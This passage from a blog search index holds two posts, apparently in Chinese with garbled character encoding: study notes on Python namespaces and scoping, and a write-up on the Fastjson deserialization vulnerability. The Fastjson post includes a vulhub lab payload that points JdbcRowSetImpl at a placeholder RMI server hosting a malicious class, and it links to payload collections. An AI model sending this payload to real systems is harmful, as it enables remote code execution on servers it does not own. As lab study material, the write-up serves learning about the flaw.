          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>pythonå‘½åç©ºé—´</title>
      <link href="/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/"/>
      <url>/2023/05/01/python%E5%91%BD%E5%90%8D%E7%A9%BA%E9%97%B4/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.bilibili.com/video/BV12F411t78n">https://www.bilibili.com/video/BV12F411t78n</a></p><p>å¼€å¤´è¯´äº†ä¸€æ®µè¯</p><figure class="highlight text"><table><tr><td class="code"><pre><span class="line">lf you import another module, it will have its global scope</span><br><span class="line">æ¯ä¸ªæ¨¡å—éƒ½æœ‰è‡ªå·±çš„å…¨å±€ç©ºé—´</span><br><span class="line">Each function has its local scope</span><br><span class="line">æ¯ä¸ªå‡½æ•°éƒ½æœ‰è‡ªå·±çš„å±€éƒ¨ç©ºé—´</span><br><span class="line">Every time the function is called, a new scope is created</span><br><span class="line">æ¯å½“å‡½æ•°è¢«è°ƒç”¨æ—¶ï¼Œå°±ä¼šåˆ›å»ºä¸€ä¸ªç©ºé—´ç»™å®ƒä½¿ç”¨</span><br><span class="line">Certain Python objects like &#x27;print&#x27; function, &#x27;None&#x27;,&#x27;True&#x27;, &#x27;False&#x27;, are available everywhere in your program and they are in the built-in scope</span><br><span class="line">pythonå†…ç½®çš„å‡½æ•°åœ¨ç¨‹åºçš„ä»»ä½•ä¸€ä¸ªç©ºé—´éƒ½æ˜¯å¯ä»¥ä½¿ç”¨çš„ï¼Œå®ƒä»¬å­˜åœ¨äºbuilt-inç©ºé—´ä¸­ã€‚</span><br><span class="line">The variables or name bindings are stored in namespaces</span><br><span class="line">å˜é‡å’Œå‡½æ•°åœ°å€éƒ½å­˜å‚¨åœ¨å‘½åç©ºé—´ä¸­</span><br></pre></td></tr></table></figure><p>è¿™æ˜¯æˆ‘æ ¹æ®è§†é¢‘çš„ç”»çš„ï¼Œå·¦è¾¹çš„globalç©ºé—´æ˜¯socketæ¨¡å—çš„ï¼Œå³è¾¹çš„globalç©ºé—´æ˜¯æˆ‘ä»¬ç¨‹åºçš„ï¼ˆæˆ‘ç»™å®ƒèµ·äº†å«originalï¼‰</p><img src="E:\typora img\Untitled-2022-08-08-1428.png" alt="Untitled-2022-08-08-1428" style="zoom:80%;" /><p>æ‰€ä»¥æˆ‘ä»¬çš„ç¨‹åºå¤„åœ¨orginalé‡Œï¼Œæ‰€ä»¥æƒ³ç”¨socketæ¨¡å—ä¸­çš„æ–¹æ³•å°±å¿…é¡»ç”¨.æ¥è®¿é—®</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="comment">#åˆ›å»ºTCP/IPå¥—æ¥å­—</span></span><br><span class="line">tcpSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"><span class="comment">#åˆ›å»ºUDP/IPå¥—æ¥å­—</span></span><br><span class="line">udpSock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æˆ‘ä»¬åƒä¸‹é¢è¿™æ ·å†™ï¼Œå°±ç›¸å½“äºæŠŠsocketæ¨¡å—å¯¼å…¥åˆ°æˆ‘ä»¬çš„å‘½åç©ºé—´originalä¸­ï¼Œå°±å¯ä»¥ç›´æ¥è°ƒç”¨æ–¹æ³•äº†</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> socket <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#åˆ›å»ºTCP/IPå¥—æ¥å­—</span></span><br><span class="line">tcpSock = socket(AF_INET, SOCK_STREAM)</span><br><span class="line"><span class="comment">#åˆ›å»ºUDP/IPå¥—æ¥å­—</span></span><br><span class="line">udpSock = socket(AF_INET, SOCK_DGRAM)</span><br></pre></td></tr></table></figure><p>ä»€ä¹ˆéƒ½æ²¡æœ‰çš„py</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">    a=<span class="number">10</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">locals</span>())<span class="comment">#æŸ¥çœ‹testå‡½æ•°æ‰€åœ¨çš„localç©ºé—´</span></span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">globals</span>())<span class="comment">#æŸ¥çœ‹globalç©ºé—´</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">dir</span>(__builtins__))<span class="comment">#æŸ¥çœ‹built-inç©ºé—´ï¼ˆå°±æ˜¯pythonçš„å†…ç½®å‡½æ•°å’Œæ¨¡å—ï¼‰</span></span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808144812676-1687707604251.png" alt="image-20220808144812676"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#global</span></span><br><span class="line">&#123;<span class="string">&#x27;__name__&#x27;</span>: <span class="string">&#x27;__main__&#x27;</span>,</span><br><span class="line"> <span class="string">&#x27;__doc__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__package__&#x27;</span>: <span class="literal">None</span>,</span><br><span class="line"> <span class="string">&#x27;__loader__&#x27;</span>: &lt;_frozen_importlib_external.SourceFileLoader <span class="built_in">object</span> at <span class="number">0x0000023A5A4A0850</span>&gt;,  <span class="string">&#x27;__spec__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;__annotations__&#x27;</span>: &#123;&#125;, </span><br><span class="line"> <span class="string">&#x27;__builtins__&#x27;</span>: &lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;,  </span><br><span class="line"> <span class="string">&#x27;__file__&#x27;</span>: <span class="string">&#x27;d:\\python3.8\\code\\1.py&#x27;</span>, </span><br><span class="line"> <span class="string">&#x27;__cached__&#x27;</span>: <span class="literal">None</span>, </span><br><span class="line"> <span class="string">&#x27;test&#x27;</span>: &lt;function test at <span class="number">0x0000023A5A5E9F70</span>&gt;&#125;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808140251398-1687707604252.png" alt="image-20220808140251398"></p><p>å› ä¸ºåœ¨my_funcä¸­å…ˆä½¿ç”¨äº†å˜é‡a<code>print(f&quot;iprefix&#125; &#123;a&#125;&quot;)</code>,ç„¶åæ‰åœ¨my_funcä¸­å£°æ˜äº†å˜é‡a,æ‰€ä»¥æŠ¥é”™ã€‚</p><p><img src="/../images/image-20220808140402575-1687707604252.png" alt="image-20220808140402575"></p><p>åœ¨my_funcä¸­å£°æ˜äº†<code>global a</code>,æ‰€ä»¥pythonçŸ¥é“localç©ºé—´ä¸­çš„aæŒ‡å‘globalç©ºé—´ä¸­çš„aã€‚</p><p>æ‰€ä»¥åœ¨localä¸­æ”¹å˜açš„å€¼ï¼Œä¼šå½±å“globalä¸­çš„aã€‚</p><p><img src="/../images/image-20220808140452593-1687707604252.png" alt="image-20220808140452593"></p><p>åŸæœ¬åœ¨globalç©ºé—´ä¸­æ²¡æœ‰å˜é‡a,ä½†æ˜¯åœ¨localä¸­å£°æ˜äº†<code>global a</code>ï¼Œpythonä¼šè‡ªåŠ¨åœ¨globalä¸­åˆ†é…ç©ºé—´ç»™å˜é‡aã€‚</p><blockquote><p>ä½œè€…è¯´itâ€™s bad codeğŸ˜„</p></blockquote><p><img src="/../images/image-20220808140611573-1687707604252.png" alt="image-20220808140611573"></p><p><code>globals()</code>è¿”å›çš„æ˜¯å­—å…¸å½¢å¼ï¼Œå¯ä»¥é€šè¿‡é”®å€¼ç´¢å¼•çš„æ–¹å¼è®¿é—®ã€‚</p><p><img src="/../images/image-20220808140711338-1687707604252.png" alt="image-20220808140711338"></p><p>å¦‚ä½•å±•ç¤ºå‡½æ•°çš„localç©ºé—´ä¸­ä¿å­˜çš„å˜é‡</p><ol><li><p>å‡½æ•°çš„bodyä¸­<code>print(locals())</code></p></li><li><p>é€šè¿‡å‡½æ•°çš„codeæ–¹æ³•ä¸‹çš„å±æ€§è®¿é—®</p><p><img src="/../images/image-20220808151843058-1687707604252.png" alt="image-20220808151843058"></p></li></ol><p><img src="/../images/image-20220808153058120-1687707604253.png" alt="image-20220808153058120"></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a=<span class="number">10</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():</span><br><span class="line">x=<span class="number">20</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test2</span>():</span><br><span class="line"><span class="keyword">global</span> x</span><br><span class="line">x=<span class="number">10</span></span><br><span class="line">test2()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"></span><br><span class="line">test()</span><br><span class="line"><span class="built_in">print</span>(x)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141136207-1687707604253.png" alt="image-20220808141136207"></p><p><img src="/../images/image-20220808141228174-1687707604253.png" alt="image-20220808141228174"></p><p>nonlocalç”¨äºå¯»æ‰¾åŒä¸ºlocalç©ºé—´çš„å˜é‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nonlocal means, not in the current function&#x27;s local scope and neither in the global scope</span><br><span class="line">nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20220808141525359-1687707604253.png" alt="image-20220808141525359"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>è™½ç„¶globalä¸­å£°æ˜äº†å˜é‡aï¼Œä½†æ˜¯nonlocalè¿˜æ˜¯æ‰¾ä¸åˆ°å˜é‡a</p><p><img src="/../images/image-20220808141845300-1687707604253.png" alt="image-20220808141845300"></p><p><img src="/../images/image-20220808141538079-1687707604253.png" alt="image-20220808141538079"></p><p>å³ä½¿åœ¨localä¸­å£°æ˜äº†<code>global a</code>,nonlocalä»ç„¶æ‰¾ä¸åˆ°å˜é‡a</p><p>æ‰€ä»¥nonlocalçš„å¯»æ‰¾èŒƒå›´ï¼šä¸Šä¸€çº§localç©ºé—´åˆ°globalç©ºé—´çš„ä¸‹ä¸€çº§</p>]]></content>
      
      
      <categories>
          
          <category> ç¼–ç¨‹è¯­è¨€ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Fastjsonæ¼æ´</title>
      <link href="/2023/05/01/fastjson/"/>
      <url>/2023/05/01/fastjson/</url>
      
        <content type="html"><![CDATA[<h2 id="FastJson"><a href="#FastJson" class="headerlink" title="FastJson"></a>FastJson</h2><h3 id="æ˜¯ä»€ä¹ˆ"><a href="#æ˜¯ä»€ä¹ˆ" class="headerlink" title="æ˜¯ä»€ä¹ˆ"></a>æ˜¯ä»€ä¹ˆ</h3><blockquote><p>Fastjsonæ˜¯é˜¿é‡Œå·´å·´å…¬å¸å¼€æºçš„ä¸€æ¬¾jsonè§£æå™¨ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ°JavaBeanã€‚</p></blockquote><h3 id="ååºåˆ—åŒ–æ¼æ´"><a href="#ååºåˆ—åŒ–æ¼æ´" class="headerlink" title="ååºåˆ—åŒ–æ¼æ´"></a>ååºåˆ—åŒ–æ¼æ´</h3><h4 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h4><blockquote><p>1.2.24ï¼šfastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨<code>autoType</code>æ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„<code>setter/getter</code>æ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚ </p><p>1.2.47ï¼šfastjsonäº1.2.24ç‰ˆæœ¬åå¢åŠ äº†ååºåˆ—åŒ–ç™½åå•ï¼Œè€Œåœ¨1.2.48ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹æ®Šæ„é€ çš„jsonå­—ç¬¦ä¸²ç»•è¿‡ç™½åå•æ£€æµ‹ï¼ŒæˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚</p></blockquote><h4 id="åºåˆ—åŒ–"><a href="#åºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–"></a>åºåˆ—åŒ–</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;lihua&quot;</span>,<span class="number">3</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName);</span><br><span class="line">        System.out.println(json);</span><br></pre></td></tr></table></figure><p>åºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨<code>Getter</code>æ–¹æ³•</p><p><img src="/../images/image-20230514163030544-1687586985305.png" alt="image-20230514163030544"></p><p><code>@type</code> æŒ‡å®šç±»ï¼Œå…¶ä»–ä¸ºè¯¥ç±»<code>Getter</code>æ–¹æ³•è¿”å›çš„ç±»å±æ€§</p><h4 id="ååºåˆ—åŒ–"><a href="#ååºåˆ—åŒ–" class="headerlink" title="ååºåˆ—åŒ–"></a>ååºåˆ—åŒ–</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.liang.pojo.User\&quot;,\&quot;id\&quot;:3,\&quot;name\&quot;:\&quot;lihua\&quot;&#125;&quot;</span>;</span><br><span class="line">System.out.println(JSON.parseObject(json));</span><br><span class="line">System.out.println(JSON.parse(json));</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨<code>JSON.parse</code>æ–¹æ³•ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„setæ–¹æ³•</li><li>ä½¿ç”¨<code>JSON.parseObject</code>æ–¹æ³•ååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»getå’Œsetæ–¹æ³•</li></ul><p>ç®€å•åˆ†æ</p><p><a href="https://xz.aliyun.com/t/12096">ä»0åˆ°1çš„fastjsonçš„ååºåˆ—åŒ–æ¼æ´åˆ†æ - å…ˆçŸ¥ç¤¾åŒº</a></p><h3 id="vulhubå¤ç°"><a href="#vulhubå¤ç°" class="headerlink" title="vulhubå¤ç°"></a>vulhubå¤ç°</h3><p><a href="https://vulhub.org/#/environments/fastjson/1.2.24-rce/">https://vulhub.org/#/environments/fastjson/1.2.24-rce/</a></p><p>payload</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;b&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetlmpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;rmi://å¼€å¯rmiæœåŠ¡çš„ip:prot/æ¶æ„ç±»å&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span>ture</span><br><span class="line">  <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>ç”¨<code>jdk8u371</code>ç¼–è¯‘çš„<code>class</code>æˆåŠŸäº†ã€‚</p><h3 id="å¦‚ä½•ç¡®è®¤å­˜åœ¨è¯¥ç»„ä»¶"><a href="#å¦‚ä½•ç¡®è®¤å­˜åœ¨è¯¥ç»„ä»¶" class="headerlink" title="å¦‚ä½•ç¡®è®¤å­˜åœ¨è¯¥ç»„ä»¶"></a>å¦‚ä½•ç¡®è®¤å­˜åœ¨è¯¥ç»„ä»¶</h3><p><a href="https://www.cnblogs.com/forforever/p/16537846.html">fastjsonååºåˆ—åŒ–æ¼æ´åŒºåˆ†ç‰ˆæœ¬å·çš„æ–¹æ³•æ€»ç»“ - komomon - åšå®¢å›­</a></p><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p><a href="https://github.com/safe6Sec/Fastjson">safe6Sec&#x2F;Fastjson: Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ</a></p><h3 id="ä¸å‡ºç½‘åˆ©ç”¨å§¿åŠ¿"><a href="#ä¸å‡ºç½‘åˆ©ç”¨å§¿åŠ¿" class="headerlink" title="ä¸å‡ºç½‘åˆ©ç”¨å§¿åŠ¿"></a>ä¸å‡ºç½‘åˆ©ç”¨å§¿åŠ¿</h3><p><a href="https://mp.weixin.qq.com/s/CDKNUdVXOBmqE4mDtg8P_A">https://mp.weixin.qq.com/s/CDKNUdVXOBmqE4mDtg8P_A</a></p>]]></content>
      
      
      <categories>
          
          <category> æ¸—é€æµ‹è¯• </category>
          
      </categories>
      
      
    </entry>
    
    
  
  
</search>
